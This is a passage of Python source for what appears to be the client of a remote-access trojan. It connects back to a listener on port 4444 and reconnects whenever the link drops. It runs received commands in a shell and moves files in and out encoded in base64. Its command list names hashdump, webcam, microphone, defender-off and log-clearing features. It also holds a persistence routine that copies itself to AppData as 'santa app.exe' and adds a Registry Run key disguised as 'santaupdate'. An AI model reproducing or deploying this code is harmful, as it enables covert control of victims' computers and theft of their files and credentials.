    elif cmd == 'quit' or cmd == 'exit':
        return bytes(Fore.LIGHTGREEN_EX + '\n[@] Console: use "!quit" to quit the session\n', format)
    elif cmd == Fore.RED + '[-] Error occured\n':
        return bytes(Fore.RED + '\n[-] Error occurred\n', format)
    elif cmd == 'color':
        colors = ['BLACK', 'BLUE', 'CYAN', 'GREEN', 'LIGHTBLACK', 'LIGHTBLUE', 'LIGHTCYAN', 'LIGHTGREEN', 'LIGHTMAGENTA', 'LIGHTRED', 'LIGHTWHITE', 'LIGHTYELLOW', 'MAGENTA', 'RED', 'RESET', 'WHITE', 'YELLOW']
        try:
            if args[0].upper() not in colors:
                return bytes(Fore.LIGHTMAGENTA_EX + '\n[*] A new theme was applied\n', format)
            else:
                return bytes(Fore.LIGHTGREEN_EX + f'\n[@] Console: color {args[0].upper()} was applied\n', format)
        except: return bytes(Fore.LIGHTMAGENTA_EX + '\n[*] A new theme was applied\n', format)
custom_commands = [
    'os',  # main command
    # other commands dnss, arps
    '?', '?1', '?2', '?3', '?4', '?5', '?6', '/', '/?',
    'bcap', 'browse', 'browsers',
    'cam', 'cam_list', 'clearev', 'connect', 'crs',
    'decrypt', 'defoff', 'dget', 'du',
    'encrypt', 'exec', 'expl',
    'getuid', 'gpu',
    'hashdump', 'help',
    'idletime', 'interact',
    'jsi',
    'lpwd', 'lcd', 'lcp',
    'mic', 'msg',
    'nwi',
    'pc', 'prs', 'pss', 'pysh',
    'rec', 'run',
    'search', 'shell', 'src', 'srq', 'startup', 'sysinfo', 'syspower',
    'time', 'timeinfo',
    'use',
    'version',
    'web_cam', 'webcam_list', 'wifips',

    # special cmds
    Fore.RED + '[-] Error occured\n',
    'color',
    'quit',
    'exit',
]
too_long_command = False

def exec_sys_cmd(cmd):
    global too_long_command
    check_variable_type = isinstance(cmd, list)
    if check_variable_type == True:  # convert the list into a string
        if len(cmd) > 1:
            full_command = cmd
            cmd = cmd[0]
            too_long_command = True
        else:
            too_long_command = False
        cmd = str(cmd)   # ['command'] (list) => ['command'] (str)
        if too_long_command != True:
            cmd = cmd[2:-2]  # removes the extra square brackets from the list => 'command'
        else:
            cmd = cmd[0:]

    if cmd in custom_commands:
        if too_long_command == True:
            command_args = ''
            for argument in full_command:
                command_args += ' ' + argument
            command_args = command_args[1:]  # remove the first ' ' (space)
            return custom_cmd(command_args)
        else:
            return custom_cmd(cmd)
    else:
        try:
            return subprocess.check_output(cmd, shell=True)
        except subprocess.CalledProcessError:        
            cmd = Fore.RED + '\n[-] Failure\n'
            return bytes(cmd, format)

def change_working_dir(path):
    try:
        os.chdir(path)
    except: # FileNotFoundError, OSError
        try:
            os.chdir(path[1:-1])
        except:
            return bytes(Fore.RED + "\n[-] Directory not found\n", format)
    if path == '..':
        path = os.getcwd()
    return bytes(Fore.GREEN + "\n[+] Current Working Directory: \n" + Fore.YELLOW + f"{path}\n", format)


def read_file(path): # admin download
    try:
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())
    except:
        return bytes(Fore.RED + '[-] File not found\n', format)


def write_file(path, content):  # admin upload
    with open(path, 'wb') as file:
        file.write(base64.b64decode(content))


def sendBox(data):
    global connection
    connection.send(data)
    # message = data.encode(format)
    # msg_length = len(data)
    # send_length = str(msg_length).encode(format)
    # send_length += b' ' * (buffer_size - len(send_length))
    # connection.send(send_length)
    # connection.send(message)
    # print(connection.recv(2048).decode(format))



def receiveBox():
    global buffer_size
    msg = ""
    import ast
    try:
        msg = connection.recv(buffer_size).decode(format)
    except:
        # try:
        #     time.sleep(30)
        #     os.startfile(__file__[:-2]+"exe")
        # except FileNotFoundError:
        #     try:
        #         time.sleep(30)
        #         os.startfile(__file__[:-2]+"py")
        #     except: pass
        establish_connect()
    msg__ = ""
    for m_ in msg:
        if m_ != "'":
            msg__ += m_
    msg = ast.literal_eval(msg)
    return msg

def make_sock():
    global connection
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
make_sock()



def rg_add():
    file_location = os.environ['appdata'] + "\\santa app.exe"
    if not os.path.exists(file_location):
        file_name = 'santaupdate'
        shutil.copyfile(sys.executable, file_location)
        subprocess.call(f'reg add HKCU\\Software\\Microsoft\\CurrentVersion\\Run /v {file_name} /t REG_SZ /d "' + file_location + '"', shell=True)


# rg_add()



def establish_connect():
    global connection
    try:
        try:
            connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connection.connect(('localhost', 4444))
        except TimeoutError:
            establish_connect()
        #print('*'*50) save
    except ConnectionRefusedError:
        # time.sleep(60) 
        # print('#'*50) #save
        establish_connect()
establish_connect()



while True:
    command = receiveBox()
    if command[0] == '!quit':
        def rerun():
            connection.close()
            establish_connect()

        rerun()



    elif command[0] == 'download':
        try:
            cmd_result = read_file(command[1])
        except:
            cmd_result = bytes(Fore.RED + "[-] Error occured\n", format)



    elif command[0] == 'cd' and len(command) > 1:
        if command[1] == '..':
            cmd_result = change_working_dir(command[1])
        path_ = ""
        if len(command) > 1 and command[1] != '..':
            for c_ in range(len(command)-1):
                path_ += command[c_+1] + ' '
            cmd_result = change_working_dir(path_[1:-2])
        else:
            if command[1] != '..':
                cmd_result = change_working_dir(command[1])



    elif command[0] == 'upload':
        if len(command) == 3:
            try:
                write_file(command[1], command[2])
                CWD1 = os.getcwd()
                cmd_result = bytes(Fore.GREEN + '\n[+] File successfully uploaded\n' + Fore.CYAN + f'[i] File uploaded in - {CWD1}\n', format)
            except:
                cmd_result = bytes(Fore.RED + "\n[-] Error occured\n" + Fore.LIGHTGREEN_EX + '[@] Help: use "help upload"\n', format)
        else:
            cmd_result = bytes(Fore.RED + "\n[-] Error occured\n" + Fore.LIGHTGREEN_EX + '[@] Help: use "help upload"\n', format)


    else:
        cmd_result = exec_sys_cmd(command)



    try:
        sendBox(cmd_result)
    except NameError:
        pass

